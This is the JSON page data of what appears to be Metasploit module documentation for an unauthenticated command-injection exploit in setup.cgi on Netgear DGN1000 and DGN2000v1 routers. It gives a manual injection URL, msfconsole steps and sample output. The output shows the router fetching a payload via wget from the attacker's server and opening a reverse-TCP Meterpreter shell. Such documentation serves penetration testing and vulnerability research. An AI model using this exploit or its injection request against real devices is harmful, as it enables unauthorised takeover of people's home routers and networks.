{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/netgear_dgn1000_setup_unauth_exec","result":{"data":{"moduleMetadataJson":{"id":"06f46f5b-2f1e-57f6-b676-1282f25aed62","name":"Netgear DGN1000 Setup.cgi Unauthenticated RCE","fullname":"exploit/linux/http/netgear_dgn1000_setup_unauth_exec","description":"This module exploits an unauthenticated OS command execution vulneralbility\n        in the setup.cgi file in Netgear DGN1000 firmware versions up to 1.1.00.48, and\n        DGN2000v1 models.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/netgear_dgn1000_setup_unauth_exec","documentationSlug":"/modules/documentation/exploit/linux/http/netgear_dgn1000_setup_unauth_exec","referencesSlug":"/modules/references/exploit/linux/http/netgear_dgn1000_setup_unauth_exec"},"documentation":{"html":"<p>The module netgear<em>dgn1000</em>setup<em>unauth</em>exec exploits an unauthenticated OS command injection vulnerability in vulnerable Netgear DGN1000 with firmware versions up to <code class=\"language-text\">1.1.00.48</code> in addition to DGN2000v1 models, all firmware versions. The vulnerability occurs in within the <code class=\"language-text\">syscmd</code> fuction of the <code class=\"language-text\">setup.cgi</code> script to execute arbitrary commands. Manual exploitation could be completed through the browser, as for example : <code class=\"language-text\">http://&lt;RouterIP&gt;/setup.cgi?next_file=netgear.cfg&amp;todo=syscmd&amp;cmd=echo+vulnerable&amp;curpath=/&amp;currentsetting.htm=1</code>. Such example will return \"vulnerable\" on the page. Vulnerable models have <code class=\"language-text\">wget</code> installed on <code class=\"language-text\">/usr/bin/wget</code> and can be leveraged to drop a MIPS Big Endian payload.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Netgear DGN1000 with firmware versions up to <code class=\"language-text\">1.1.00.48</code> and DGN2000v1 models</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do : <code class=\"language-text\">use exploit/linux/http/netgear_dgn1000_setup_unauth_exec</code></li>\n<li>Do : <code class=\"language-text\">set RHOST [RouterIP]</code></li>\n<li>Do : <code class=\"language-text\">set PAYLOAD [payload]</code></li>\n<li>Do : <code class=\"language-text\">run</code></li>\n<li>If router is vulnerable, payload should be dropped via wget and executed, and therein should obtain an session</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>Sample output of a successfull exploitation should be look like this :</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/http/netgear_dgn1000_setup_unauth_exec\nmsf exploit(netgear_dgn1000_setup_unauth_exec) &gt; set RHOST 192.168.0.1\nRHOST =&gt; 192.168.0.1\nmsf exploit(netgear_dgn1000_setup_unauth_exec) &gt; set RPORT 80\nRPORT =&gt; 80\nmsf exploit(netgear_dgn1000_setup_unauth_exec) &gt; set LHOST eth0\nLHOST = eth0\nmsf exploit(netgear_dgn1000_setup_unauth_exec) &gt; set PAYLOAD linux/mipsbe/meterpreter/reverse_tcp\nPAYLOAD =&gt; linux/mipsbe/meterpreter/reverse_tcp\nmsf exploit(netgear_dgn1000_setup_unauth_exec) &gt; run\n\n[*] Started reverse TCP handler on 192.168.0.11:4444\n[*] 192.168.0.1:80 - Connecting to target...\n[*] 192.168.0.1:80 - Exploiting target ....\n[*] Using URL: http://0.0.0.0:8080/DnuJhOHYg7auIz\n[*] Local IP: http://192.168.0.11:8080/DnuJhOHYg7auIz\n[*] Client 192.168.0.1 (Wget) requested /DnuJhOHYg7auIz\n[*] Sending payload to 192.168.0.1 (Wget)\n[*] Sending stage (1073332 bytes) to 192.168.0.1\n[*] Meterpreter session 2 opened (192.168.0.11:4444 -&gt; 192.168.0.1:51558) at 2017-10-20 20:37:06 -0400\n[*] Command Stager progress - 100.00% done (129/129 bytes)\n[*] Server stopped.\n\nmeterpreter &gt; sysinfo\nComputer     : 192.168.0.1\nOS           :  (Linux 2.6.20-Amazon_SE)\nArchitecture : mips\nMeterpreter  : mipsbe/linux\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"06f46f5b-2f1e-57f6-b676-1282f25aed62"}}}